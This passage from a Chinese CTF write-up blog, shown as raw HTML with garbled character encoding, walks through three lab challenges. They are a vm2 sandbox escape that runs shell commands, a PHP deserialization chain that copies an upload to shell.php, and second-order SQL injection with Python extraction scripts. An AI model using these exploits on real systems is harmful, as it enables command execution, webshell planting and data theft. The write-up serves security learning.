class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¿™ä¸ª<code>eval</code>å…¶å®å·²ç»æš—ç¤ºäº†ï¼Œå®ƒå¹¶æ²¡æœ‰ç›´æ¥æ‰§è¡Œçš„<code>$code</code>å˜é‡ï¼Œè€Œæ˜¯é€‰æ‹©<code>eval(code)</code>ï¼Œè€Œä¸”eval()å‡½æ•°ä¸ä»…phpæœ‰ï¼Œnodejsä¹Ÿæœ‰ã€‚</p><p>è¾“å…¥<code>Error().stack</code>å°è¯•æŸ¥çœ‹æ–‡ä»¶ä½ç½®ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728092700200.png"></p><p>æˆåŠŸæ‰§è¡Œï¼Œé‚£å°±é“å®šæ˜¯nodejsäº†ï¼Œè¿˜æç¤ºäº†<code>VM</code>ï¼ŒçŒœæµ‹æ˜¯nodejsçš„VMæ²™ç›’é€ƒé€¸é—®é¢˜ï¼Œ<a href="https://www.anquanke.com/post/id/207291">åŸç†å¯ä»¥çœ‹è¿™</a>ã€‚</p><p><a href="https://github.com/patriksimek/vm2/issues/225">githubä¸Šå¯ä»¥æ‰¾åˆ°poc</a>ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">&#x27;(&#x27;</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+<span class="string">&#x27;)()&#x27;</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºbanäº†ä¸€äº›ä¸œè¥¿ï¼Œå¯ä»¥ç”¨`${`a`}`æ‹¼æ¥å­—ç¬¦ä¸²ç»•è¿‡ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728101124959.png"></p><p>æœ€ç»ˆpayload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä¼ å…¥codeå³å¯æ‹¿åˆ°flagã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728101219868.png"></p><blockquote><p>flag{b127495d-efaa-4687-93c3-f7313aced510}</p></blockquote><h2 id="å¼ºç½‘æ¯-2019-Upload"><a href="#å¼ºç½‘æ¯-2019-Upload" class="headerlink" title="[å¼ºç½‘æ¯ 2019]Upload"></a>[å¼ºç½‘æ¯ 2019]Upload</h2><p>æ³¨å†Œè´¦å·åç™»å½•å¯ä¸Šä¼ æ–‡ä»¶ï¼Œéšä¾¿ä¸Šä¼ ä¸ªğŸå‘ç°è¢«è½¬æˆ<code>.png</code>åç¼€äº†ã€‚</p><p>ä¸€èˆ¬è¿™ç§é¢˜éƒ½ä¼šç»™æºç çš„ï¼Œç›´æ¥ä¸Š<code>dirsearch</code>ï¼Œå¯ä»¥æ‰«å‡ºä¸ª<code>www.tar.gz</code>ã€‚</p><h3 id="æ–‡ä»¶ä¸Šä¼ -ååºåˆ—åŒ–"><a href="#æ–‡ä»¶ä¸Šä¼ -ååºåˆ—åŒ–" class="headerlink" title="æ–‡ä»¶ä¸Šä¼  + ååºåˆ—åŒ–"></a>æ–‡ä»¶ä¸Šä¼  + ååºåˆ—åŒ–</h3><p>åœ¨<code>index.php</code>çš„login_check()é‡Œå‘ç°äº†<code>unserialize()</code>å‡½æ•°ï¼Œå£å­å°±åœ¨è¿™äº†ï¼Œå…¥å£æ˜¯cookieä¸­çš„userå‚æ•°ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728170223326.png"></p><p>æœ‰å£å­äº†å°±çœ‹çœ‹ååºåˆ—åŒ–çš„åˆ©ç”¨å‡½æ•°ï¼Œ<code>Register.php</code>é‡Œæœ‰ä¸ª<code>__destruct</code>ï¼Œ<code>$registedå’Œ$checkeræ˜¯å¯æ§çš„</code>ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯èƒ½å½“åšè·³æ¿è°ƒç”¨<code>__call</code>æ–¹æ³•ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728170418639.png"></p><p>çœ‹çœ‹<code>__call</code>æ–¹æ³•ï¼Œè¿™é‡Œ<code>$arguments</code>å‚æ•°ä¸ºç©ºï¼Œ<code>$name=index</code>ï¼Œäºæ˜¯å°±å½¢æˆäº†<code>$this-&gt;&#123;$this-&gt;index&#125;();</code>ï¼Œä½¿ç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„é”®ï¼Œä¼šè°ƒç”¨<code>__get</code>æ–¹æ³•ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728170517637.png"></p><p>è¿™æ ·<code>$except</code>å‚æ•°å°±å¯æ§äº†ï¼Œå¯æ§äº†å°±è¯´æ˜æˆ‘ä»¬å¯ä»¥è°ƒç”¨è¿™ä¸ªç±»ä¸­çš„ä»»æ„å‡½æ•°ï¼Œè¿™é‡Œå°±è¦çœ‹åˆ°<code>upload_img()</code>å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªifï¼Œç”±äº<code>$checker</code>å‚æ•°å¯æ§ï¼Œå¯ä»¥ç»•è¿‡ã€‚</p><p>ç¬¬äºŒä¸ªifï¼Œå½“æˆ‘ä»¬æœªä½¿ç”¨POSTæ–¹å¼ä¼ å…¥æ–‡ä»¶ï¼Œè€Œç›´æ¥ä½¿ç”¨GETæ–¹æ³•æ—¶ï¼Œ<code>$_FILES</code>ä¸ºç©ºï¼Œå¯ä»¥ç»•è¿‡ã€‚</p><p>æœ€åä¸€ä¸ªifï¼Œæ˜¯æˆ‘ä»¬éœ€è¦è¿›å…¥çš„ï¼Œ<code>$ext</code>å‚æ•°å¯æ§ï¼Œå¯ä»¥è¿›å…¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">    <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥æœ€åè¿™ä¸ªifï¼Œæœ‰ä¸ª<code>copy()</code>å‡½æ•°ã€‚</p><blockquote><p>bool <strong>copy</strong>    ( string <code>$source</code>   , string <code>$dest</code>   [, resource <code>$context</code>  ] )</p><p>å°†æ–‡ä»¶ä» <code>source</code> æ‹·è´åˆ° <code>dest</code>ã€‚   </p><p>å¦‚æœè¦ç§»åŠ¨æ–‡ä»¶çš„è¯ï¼Œè¯·ä½¿ç”¨ <a href="mk:@MSITStore:C:\Users\violet\Desktop\study\PHP7ä¸­æ–‡æ‰‹å†Œ.chm::/res/function.rename.html">rename()</a> å‡½æ•°ã€‚ </p></blockquote><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†æˆ‘ä»¬å…ˆä¼ å…¥çš„å›¾ç‰‡ğŸï¼Œæ‹·è´åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œä¸”æ–‡ä»¶ç±»å‹æˆ‘ä»¬å¯æ§ï¼Œé‚£å°±ç®€å•äº†ã€‚</p><p>å…ˆä¼ å…¥å›¾ç‰‡ğŸï¼Œç„¶åæ‹·è´çš„æ–‡ä»¶åä¸ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œå³å¯é€ æˆæ–‡ä»¶ä¸Šä¼ æ”»å‡»ï¼Œç›´æ¥ç»™pocã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span> = <span class="string">&quot;./upload/1f14e65dbcd17d7e2d5ffae185e31c64/1c26eabfc7eed920dad40569148bd24f.png&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;upload/shell.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span> = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> Register();</span><br><span class="line"><span class="variable">$x</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$x</span>));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„å­—ç¬¦ä¸²åœ¨cookieä¸­ä¼ å…¥ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728173558005.png"></p><p>ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ğŸå·²ç»ä¸Šä¼ æˆåŠŸäº†ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728173813027.png"></p><p>å¯ä»¥ç›´æ¥æ‹¿flagã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210728173911221.png"></p><blockquote><p>flag{2e20594a-2d06-4fe8-8040-cc59a02cdfda}</p></blockquote><h2 id="ç½‘é¼æ¯2018-Unfinish"><a href="#ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="[ç½‘é¼æ¯2018]Unfinish"></a>[ç½‘é¼æ¯2018]Unfinish</h2><p>æ€»å…±æœ‰<code>login.php</code>ï¼Œ<code>register.php</code>ï¼Œ<code>index.php</code>ä¸‰ä¸ªæ–‡ä»¶ï¼Œæœæºç æ²¡æœ‰æœå‡ºæ¥ï¼Œé¢˜ç›®ä¹Ÿæ²¡ç»™æç¤ºï¼Œæ³¨å†Œåusernameä¼šæ˜¾ç¤ºåœ¨index.phpé‡Œï¼Œé‚£è¿™å°±æœ‰å¯èƒ½å®ç°äºŒæ¬¡æ³¨å…¥ã€‚</p><h3 id="from-for-é€—å·ç»•è¿‡-åŠ å·ç»•æ³¨é‡Š"><a href="#from-for-é€—å·ç»•è¿‡-åŠ å·ç»•æ³¨é‡Š" class="headerlink" title="from for é€—å·ç»•è¿‡  + åŠ å·ç»•æ³¨é‡Š"></a>from for é€—å·ç»•è¿‡  + åŠ å·ç»•æ³¨é‡Š</h3><p>è¿™é¢˜banä¸œè¥¿å¾ˆä¸¥é‡ï¼Œé€—å·æ²¡äº†ï¼Œinformation_schemaä¹Ÿæ²¡äº†ã€‚</p><p>é€—å·å¯ç”¨ç”¨from forç»•è¿‡ï¼Œå³</p><p>substr(str,1,1) =&gt; substr(str from 1 for 1)</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210730133522771.png"></p><p>mysqlä¸­æ•°å­—ä¸å­—ç¬¦ç›¸åŠ ä¼šå°†å­—ç¬¦è½¬ä¸ºæ•°å­—ï¼Œå†è¿›è¡Œç›¸åŠ </p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210730133843357.png"></p><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½ç”¨åŠ å·æ³¨é‡Šæ‰åé¢çš„å‘½ä»¤ï¼ŒäºŒæ¬¡æ³¨å…¥è¦æ³¨æ„<code>email</code>ä¸<code>password</code>ï¼Œè¿™é‡Œç›´æ¥ç»™çˆ†åº“è„šæœ¬ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://542290f5-8044-47f2-a502-a7a50001607f.node4.buuoj.cn/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">reg = <span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetINFO</span>(<span class="params">url</span>):</span></span><br><span class="line">    INFO = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        register_data = &#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;2@<span class="subst">&#123;i&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;0&#x27; + ascii(substr((select database()) from <span class="subst">&#123;i&#125;</span> for 1)) + &#x27;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        register = requests.post(url=url + <span class="string">&quot;register.php&quot;</span>, data=register_data, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;2@<span class="subst">&#123;i&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        login = requests.post(url=url + <span class="string">&quot;login.php&quot;</span>, data=login_data, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">while</span> login.status_code != <span class="number">200</span>:</span><br><span class="line">            login = requests.post(url=url + <span class="string">&quot;login.php&quot;</span>, data=login_data, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        result = re.search(reg, login.text)</span><br><span class="line">        INFO += <span class="built_in">chr</span>(<span class="built_in">int</span>(result.group(<span class="number">1</span>)))</span><br><span class="line">        print(<span class="string">f&quot;[+]Result new is: <span class="subst">&#123;INFO&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> INFO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = GetINFO(URL)</span><br><span class="line">    print(<span class="string">f&quot;[+]Final Result is: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é¢˜æŠŠinformation_schemaç»™banäº†ï¼Œè€Œä¸”<code>mysql.innodb_table_stats</code>å’Œ<code>sys.schema_table_statistics</code>éƒ½ç”¨ä¸äº†ï¼Œåˆç€è¦çŒœæ˜¯å§= =ï¼ŒæŸ¥å¸ˆå‚…ä»¬ç»™çš„WPéƒ½æ˜¯ç›´æ¥ç»™flagè¡¨çš„ï¼Œæ”»é˜²ä¸–ç•Œå®˜æ–¹çš„ç”šè‡³è¿˜ç”¨äº†<code>information_schema</code>ï¼Œè„šæœ¬éƒ½è·‘ä¸åŠ¨ï¼Œæœäº†ã€‚</p><p>æœ€åæ”¾ä¸ªæ‹¿flagçš„è„šæœ¬ï¼Œåªèƒ½è¯´è¿˜æ˜¯å­¦äº†ä¸€ç‚¹ç‚¹ä¸œè¥¿äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://542290f5-8044-47f2-a502-a7a50001607f.node4.buuoj.cn/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">reg = <span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetINFO</span>(<span class="params">url</span>):</span></span><br><span class="line">    INFO = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        register_data = &#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;1@<span class="subst">&#123;i&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;0&#x27; + ascii(substr((select * from flag) from <span class="subst">&#123;i&#125;</span> for 1)) + &#x27;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        register = requests.post(url=url + <span class="string">&quot;register.php&quot;</span>, data=register_data, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;1@<span class="subst">&#123;i&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        login = requests.post(url=url + <span class="string">&quot;login.php&quot;</span>, data=login_data, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">while</span> login.status_code != <span class="number">200</span>:</span><br><span class="line">            login = requests.post(url=url + <span class="string">&quot;login.php&quot;</span>, data=login_data, timeout=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        result = re.search(reg, login.text)</span><br><span class="line">        INFO += <span class="built_in">chr</span>(<span class="built_in">int</span>(result.group(<span class="number">1</span>)))</span><br><span class="line">        print(<span class="string">f&quot;[+]Result new is: <span class="subst">&#123;INFO&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> INFO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = GetINFO(URL)</span><br><span class="line">    print(<span 